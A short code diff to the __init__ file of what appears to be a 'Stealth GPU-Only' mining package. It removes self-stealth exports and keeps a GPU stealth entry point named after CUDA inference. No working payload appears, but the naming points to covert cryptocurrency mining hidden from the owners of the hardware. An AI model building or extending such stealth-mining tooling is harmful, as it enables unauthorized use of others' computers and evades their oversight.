@@ -17,17 +17,14 @@ và **[Stealth Execution]** (thực thi ẩn danh) cho GPU mining environment.
 - Comprehensive logging & monitoring
 """
 
-# Export main components for easy import - CPU component removed
-from .core.self_stealth import SelfStealthManager, start_self_stealth
+# Export main components for easy import - Self-stealth removed
 # CPU stealth import removed for GPU-only mining
 from .wrappers.stealth_inference_cuda import main as gpu_stealth_main
 
 __version__ = "1.0.0"
 __author__ = "Stealth GPU-Only System"
 
-# Module metadata - CPU component removed
+# Module metadata - Self-stealth component removed
 __all__ = [
-    'SelfStealthManager',
-    'start_self_stealth', 
     'gpu_stealth_main'
 ]
